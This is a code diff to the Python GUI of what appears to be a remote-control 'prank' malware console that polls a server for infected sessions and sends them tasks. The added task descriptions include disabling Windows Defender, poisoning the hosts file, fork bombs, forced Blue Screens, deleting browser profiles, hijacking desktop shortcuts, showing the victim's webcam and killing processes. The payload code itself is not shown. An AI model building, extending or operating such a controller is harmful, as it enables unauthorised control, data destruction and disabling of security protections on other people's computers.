@@ -132,8 +132,45 @@ class App(ctk.CTk):
 
     def _add_description_box(self, parent_frame, command_str):
         DESCRIPTIONS = {
-            "show_popup": "Displays a native Windows message box...", "noise": "Toggles a continuous stream of annoying sounds...",
-            # ... (Full dictionary as before) ...
+            "show_popup": "Displays a native Windows message box with a customizable title, message, icon, and buttons.",
+            "noise": "Toggles a continuous stream of annoying sounds. Can use built-in sounds like beeps, knocking, or a custom MP3/WAV file.",
+            "set_volume": "Sets the system's master volume to a specific level.",
+            "usb_spam": "Toggles the continuous playing of USB connect and disconnect sounds.",
+            "overlay": "Toggles a screen overlay. Can be a solid color, a custom image, or a fake screen crack image. Transparency is adjustable.",
+            "clicking": "Toggles random mouse clicks at random locations on the screen.",
+            "typing": "Toggles random keyboard typing of letters and numbers.",
+            "open_cd_tray": "Attempts to open and then close the computer's CD/DVD drive tray.",
+            "app_spam": "Toggles the random opening of common applications like Notepad, Calculator, and Command Prompt.",
+            "fake_shutdown": "Initiates a fake Windows shutdown sequence with a custom message, which is then aborted before completion.",
+            "random_filenames": "Renames all files on the user's desktop to random alphanumeric strings.",
+            "toggle_hide_icons": "Toggles the visibility of all icons on the desktop.",
+            "set_wallpaper": "Changes the desktop wallpaper to a specified image file.",
+            "caps_lock": "Toggles a state where Caps Lock is forcefully enabled every second.",
+            "open_website": "Opens a specified URL in the user's default web browser.",
+            "toggle_wifi": "Turns the computer's Wi-Fi adapter on or off.",
+            "toggle_airplane_mode": "Toggles the system's Airplane Mode. (Requires Admin)",
+            "toggle_bluetooth": "Toggles the system's Bluetooth adapter on or off.",
+            "set_screen_orientation": "Rotates the screen display (e.g., upside down).",
+            "focus_steal": "Toggles a loop that constantly steals window focus, making the computer difficult to use.",
+            "set_system_time": "Changes the system's clock to a specified date and time. (Requires Admin)",
+            "self_dos": "Toggles a CPU-intensive loop to slow down the system, with adjustable power.",
+            "history_injector": "Injects a list of URLs into the history of Chrome and Edge browsers.",
+            "set_taskbar_size": "Changes the size of the Windows taskbar (Small, Normal, Large).",
+            "cursor_change": "Toggles a loop that constantly changes the mouse cursor to a random system cursor.",
+            "dns_poison": "Adds an entry to the system's hosts file to redirect a domain to a different IP. (Requires Admin)",
+            "printer_spam": "Sends multiple print jobs of custom text to the default printer.",
+            "streamer_cam": "Toggles a small, always-on-top window showing the user's webcam feed.",
+            "fork_bomb": "Launches an infinite number of its own processes to consume system resources. (Extremely Disruptive)",
+            "kill_tasks": "Attempts to terminate all non-critical processes running under the current user's account.",
+            "bsod": "Triggers an immediate Blue Screen of Death. (Requires Admin)",
+            "shortkey_lock": "Toggles a hook that blocks common system shortcuts like Alt+Tab and the Windows key.",
+            "user_change": "Disconnects the current user, forcing them back to the Windows login screen.",
+            "screen_reader": "Toggles the Windows Narrator screen reader.",
+            "safe_boot": "Forces the computer to restart into Safe Mode with Networking. (Requires Admin)",
+            "browser_eraser": "Deletes the user data folders for Chrome and Edge, wiping all profiles, extensions, and history.",
+            "not_so_shortcut": "Hijacks all shortcuts on the desktop to open a specified URL instead of their original target.",
+            "disable_defender": "Attempts to disable Windows Defender's real-time monitoring. (Requires Admin & Tamper Protection off)",
+            "taskbar_scramble": "Moves the Windows taskbar to a random position (top, bottom, left, or right) and restarts explorer.",
         }
         desc_text = DESCRIPTIONS.get(command_str, "No description available.")
         num_lines = desc_text.count('\n') + 1; calculated_height = (num_lines * 14) + 15 
@@ -347,8 +384,8 @@ class App(ctk.CTk):
         
     def _build_user_change_ui(self, parent_frame):
         ctk.CTkLabel(parent_frame, text="33. User Change", font=ctk.CTkFont(weight="bold")).pack(pady=10)
-        user_entry = ctk.CTkEntry(parent_frame, placeholder_text="Enter username", width=300); user_entry.pack(pady=10)
-        btn = ctk.CTkButton(parent_frame, text="Switch User", command=lambda: self._execute_action_with_cooldown(lambda: self.send_task("user_change", {"username": user_entry.get()})))
+        user_entry = ctk.CTkEntry(parent_frame, placeholder_text="Enter username (optional)", width=300); user_entry.pack(pady=10)
+        btn = ctk.CTkButton(parent_frame, text="Disconnect User", command=lambda: self._execute_action_with_cooldown(lambda: self.send_task("user_change", {"username": user_entry.get()})))
         btn.pack(pady=20)
     
     def _build_dns_poison_ui(self, parent_frame):
@@ -361,8 +398,6 @@ class App(ctk.CTk):
     def _send_toggle_task(self, action, new_state, args={}):
         command_prefix = "start" if new_state else "stop"
         
-        # Map the internal state key to the correct command, as they can differ
-        # e.g., internal state is "clicking", payload command is "start_random_clicking"
         command_map = {
             "clicking": "random_clicking",
             "typing": "random_typing",
@@ -373,7 +408,6 @@ class App(ctk.CTk):
         command_base = command_map.get(action, action)
         command = f"{command_prefix}_{command_base}"
 
-        # Update the local state immediately for instant UI feedback
         self.session_states.setdefault(self.active_session_id, {})[action] = new_state
         self.send_task(command, args)
         
@@ -382,10 +416,8 @@ class App(ctk.CTk):
             return
         self.cooldown_active = True
         
-        # Store which action view we are on so we can redraw it later
         active_button_info = next(((cmd, btn.cget("text")) for cmd, btn in self.action_buttons.items() if btn.cget("fg_color") != "transparent"), None)
         
-        # Gather all widgets in the current control panel
         all_controls = []
         for widget in self.control_frame.winfo_children():
             if isinstance(widget, ctk.CTkFrame):
@@ -394,21 +426,16 @@ class App(ctk.CTk):
             else:
                 all_controls.append(widget)
         
-        # ### THIS IS THE FIX ###
-        # Use a try-except block to safely disable all interactive widgets.
         for control in all_controls:
             try:
                 control.configure(state="disabled")
             except (TclError, AttributeError):
-                # This widget doesn't have a 'state' option or configure method, so we ignore it.
                 pass
 
         action_func()
         
-        # After a 3-second cooldown, re-enable the controls
         def re_enable():
             self.cooldown_active = False
-            # Redraw the control panel to restore widget states correctly
             if active_button_info: 
                 self._display_controls_for(active_button_info[0], active_button_info[1])
 
@@ -432,7 +459,7 @@ class App(ctk.CTk):
                 if response.status_code == 200: 
                     self.after(0, self.update_gui_with_sessions, response.json())
             except requests.exceptions.RequestException: 
-                pass # Ignore connection errors during polling
+                self.after(0, self.update_gui_with_sessions, []) # Clear sessions on error
             time.sleep(5)
 
     def update_gui_with_sessions(self, server_sessions):
@@ -442,7 +469,6 @@ class App(ctk.CTk):
         current_sids = set(self.sessions.keys())
         new_sids = server_session_ids
         
-        # Add new sessions
         for sid in new_sids - current_sids:
             session_data = next((s for s in server_sessions if s["session_id"] == sid), None)
             if session_data:
@@ -450,7 +476,6 @@ class App(ctk.CTk):
                 self.add_session_widget(session_data)
                 self.session_states[sid] = {k: False for k in STATE_KEYS}
 
-        # Update existing sessions
         for sid in new_sids.intersection(current_sids):
             session_data = next((s for s in server_sessions if s["session_id"] == sid), None)
             if session_data:
@@ -459,7 +484,6 @@ class App(ctk.CTk):
                 if sid in self.session_widgets:
                     self.session_widgets[sid]["button"].configure(fg_color="green" if is_active else "orange")
 
-        # Remove old sessions
         for sid in current_sids - new_sids:
             if sid in self.session_widgets: 
                 self.session_widgets[sid]["frame"].destroy()
